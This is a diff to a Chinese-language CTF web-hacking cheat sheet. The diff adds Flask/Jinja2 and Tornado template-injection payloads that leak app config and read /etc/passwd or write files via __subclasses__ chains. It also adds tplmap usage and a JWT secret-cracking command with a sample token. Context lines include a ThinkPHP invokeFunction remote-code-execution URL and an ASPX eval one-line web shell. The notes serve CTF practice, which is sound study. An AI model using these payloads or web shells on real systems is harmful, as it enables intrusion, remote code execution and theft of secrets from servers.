@@ -10,19 +10,6 @@
   vim -r .index.php.swp #转化为index.php
   ```
 
-* .pyc
-
-  ```shell
-  cat flag.pyc  #查看.pyc文件的内容，flag可能可以直接找到。
-  ```
-
-  还原.pyc文件，使用`uncompyle2`
-
-  ```shell
-  #uncompyle2工具在kali虚拟机中
-  uncompyle2 -o f.py flag.pyc  # f.py还原好的文件  flag.pyc需要还原的文件
-  ```
-
 * .DS_Store
 
   ds_store_exp，这是一个 .DS_Store 文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。
@@ -546,15 +533,44 @@ index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]
 
 # Python
 
-### templete injection
+## .pyc
 
-1. 简单嗅探
+```
+cat flag.pyc  #查看.pyc文件的内容，flag可能可以直接找到。
+```
+
+还原.pyc文件，使用`uncompyle2`
+
+```shell
+#uncompyle2工具在kali虚拟机中
+uncompyle2 -o f.py flag.pyc  # f.py还原好的文件  flag.pyc需要还原的文件
+```
+
+## 模板注入
+
+详细的沙盒逃逸见：[Python沙盒逃逸小结.md](./Python沙盒逃逸小结.md)
+
+1. 测试模板注入
+
+   ```shell
+   # 使用tplmap.py测试
+   python ./tplmap.py -u ‘xxxxxx’
+   ```
 
    http://111.198.29.45:42611/{{7+7}}
 
    若返回：URL http://111.198.29.45:59331/14 not found，则说明执行了{{}}内的代码
 
-2. {{ config.items() }}查看服务器配置
+2. 常用的模板注入
+
+   ```
+   ?name={{config}}
+   ?name={{config.items()}}
+   ?name={{person.secret}}
+   ?name={{self.__dict__}}
+   ?name={{url_for.__globals__['current_app'].config}}
+   ?name={{get_flashed_messages.__globals__['current_app'].config}}
+   ```
 
 3. {{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}  读取密码
 
@@ -586,7 +602,14 @@ index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]
     ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
    ```
 
-7. 
+
+## Tornado框架
+
+1. 查看应用设置
+
+   ```
+   {{handler.settings}}
+   ```
 
 # 一句话木马
 
@@ -601,4 +624,14 @@ index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]
 ```aspx
 <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
 ```
+
+# JWT伪造
+
+密钥爆破工具：c-jwt-cracker
+
+```
+$ > ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
+```
+
+
 
